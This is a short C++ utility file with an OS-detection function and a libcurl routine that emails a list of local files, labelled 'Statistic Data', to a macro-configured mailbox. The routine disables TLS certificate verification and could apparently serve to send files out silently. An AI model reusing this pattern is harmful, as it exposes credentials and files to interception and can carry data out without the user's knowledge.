//
// Created by jkearnsl on 10.02.24.
//

#include "utils.h"

std::string osName() {
    #ifdef _WIN32
    return "Windows";
    #elif _WIN64
    return "Windows";
    #elif __APPLE__ || __MACH__
    return "MacOS";
    #elif __linux__
    return "Linux";
    #else
    return "Other";
    #endif
}

int sendMail(const std::list<std::string>& filepaths) {

    CURL *curl;
    CURLcode res = CURLE_OK;

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *recipients = nullptr;
        curl_mime *mime;
        curl_mimepart *part;

        recipients = curl_slist_append(recipients, MAIL_TO);

        curl_easy_setopt(curl, CURLOPT_USERNAME, MAIL_USERNAME);
        curl_easy_setopt(curl, CURLOPT_PASSWORD, MAIL_PASSWORD);
        curl_easy_setopt(curl, CURLOPT_URL, MAIL_URL);
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, MAIL_FROM);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        mime = curl_mime_init(curl);

        part = curl_mime_addpart(mime);
        curl_mime_data(part, "Statistic Data", CURL_ZERO_TERMINATED);
        curl_mime_type(part, "text/plain");

        for (const auto& filepath : filepaths) {
            part = curl_mime_addpart(mime);
            curl_mime_filedata(part, filepath.c_str());
            curl_mime_type(part, "text/plain");
            curl_mime_filename(part, filepath.substr(filepath.find_last_of("/\\") + 1).c_str());
        }

        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

        res = curl_easy_perform(curl);

        if(res != CURLE_OK)
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;

        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    }
    return (int)res;
}